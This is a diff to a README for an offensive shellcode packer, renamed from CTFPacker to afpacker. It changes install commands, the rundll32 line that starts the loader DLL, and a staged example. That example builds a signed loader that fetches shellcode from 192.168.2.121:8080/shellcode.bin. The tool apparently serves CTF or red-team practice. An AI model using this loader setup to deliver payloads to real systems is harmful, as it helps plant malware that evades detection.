@@ -122,12 +122,12 @@ After the basis installation, don't forget to install the python requirements ! 
 **Linux**:
 ```bash
 # Via pipx (preferred way)
-cd CTFPacker
+cd afpacker
 python3 -m pipx install .
-# You can use ctfpacker globaly now
+# You can use afpacker globaly now
 
 # Via manual virtual environment
-cd CTFPacker
+cd afpacker
 python3 -m venv env
 source env/bin/activate
 python3 -m pip install .
@@ -136,14 +136,14 @@ python3 -m pip install .
 deactivate
 
 # Old fashion
-cd CTFPacker
+cd afpacker
 python3 -m pip install -r requirements.txt --break-system-packages
 python3 main.py -h
 ```
 **Windows**:
 ```powershell
 # Via pip
-cd CTFPacker
+cd afpacker
 python3 -m pip install .
 
 # Done ! :)
@@ -160,7 +160,7 @@ General usage:
 ```
 usage: main.py [-h] {staged,stageless} ...
 
-CTFPacker
+afpacker
 
 positional arguments:
   {staged,stageless}  Staged or Stageless Payloads
@@ -226,7 +226,7 @@ In both cases, staged or stageless, you can choose whether to compile your loade
 The DLL version exports a function called `ctf`. This is the function you need to call to start the exection. 
 
 ```powershell
-rundll32.exe afinjector.dll,ctf
+rundll32.exe afloader.dll,ctf
 ```
 
 ### Staged
@@ -236,7 +236,7 @@ When using the staged "mode", the packer will generate you a .bin file named acc
 Example:
 
 ```powershell
-python main.py staged -p "C:\Code\CTFPacker\calc.bin" -i 192.168.2.121 -po 8080 -pa /shellcode.bin -o shellcode -s -pfx cert.pfx -pfx-pass Password
+python main.py staged -p "C:\Code\afpacker\calc.bin" -i 192.168.2.121 -po 8080 -pa /shellcode.bin -o shellcode -s -pfx cert.pfx -pfx-pass Password
 ```
 
 
